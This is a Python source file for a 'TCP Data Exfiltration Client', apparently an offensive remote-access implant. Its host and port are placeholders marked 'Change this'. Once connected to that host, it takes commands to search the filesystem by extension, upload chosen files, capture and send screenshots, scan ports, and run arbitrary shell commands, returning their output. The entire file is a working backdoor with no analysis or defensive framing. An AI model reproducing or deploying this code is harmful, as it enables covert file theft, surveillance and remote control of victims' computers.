# TCP Data Exfiltration Client

import socket, subprocess, os, shutil, tempfile
from PIL import ImageGrab


Host = '127.0.0.1'  #Change this
Port = 8080    #Change this


def transfer(s,source):
    if os.path.exists(source):
        f = open(source, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()

    else: # the file doesn't exist
        s.send('Unable to find out the file')

def screenshot(s,source):
    if os.path.exists(source):
        f = open(source, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()

    else: # the file doesn't exist
        s.send('Unable to find out the file')

def scanner(s,ip,ports):
    scan_results = ''
    for port in ports.split(','):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            output = sock.connect_ex((ip, int(port)))

            if output == 0:
                scan_results += "[+] Port " + port + " is open" + '\n'
            else:
                scan_results += "[-] Port " + port + " is closed" + '\n'
            sock.close()
        except Exception as e:
            pass
    s.send(scan_results)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((Host, Port))

    while True:
        command = s.recv(1024)

        if 'terminate' in command:
            s.close()
            break

        elif 'search' in command: #syntax search path ext
            null, path, ext = command.split(' ')
            list = ''

            for dirpath, dirname, fiels in os.walk(path):
                for file in fiels:
                    if file.endswith("."+ext):
                        list += '\n'+ os.path.join(dirpath, file)
            enc_list = list.encode('utf-8')
            s.send(enc_list)

        elif 'grab' in command:  #syntax grab source_path destination_path
            null1,source,null2 = command.split(' ')

            try:
                transfer(s,source)
            except Exception as e:
                s.send ( str(e) )
                pass

        elif 'scan' in command: #syntax  scan ip 23,23
            null,ip,ports = command.split(' ')
            scanner(s,ip,ports)

        elif 'screencap' in command: #syntax schreenshot destination_path
            dirpath = tempfile.mkdtemp()
            ImageGrab.grab().save(dirpath+'\img.jpg', "JPEG")
            source = dirpath + '\img.jpg'

            try:
                screenshot(s,source)
                shutil.rmtree(dirpath)
            except Exception as e:
                pass

        elif 'cd' in command: #syntax cd path
            null, directorty = command.split(" ")
            os.chdir(directorty)
            s.send('Directory changed')

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read() )
            s.send( CMD.stderr.read() )


def main ():
    connect()
main()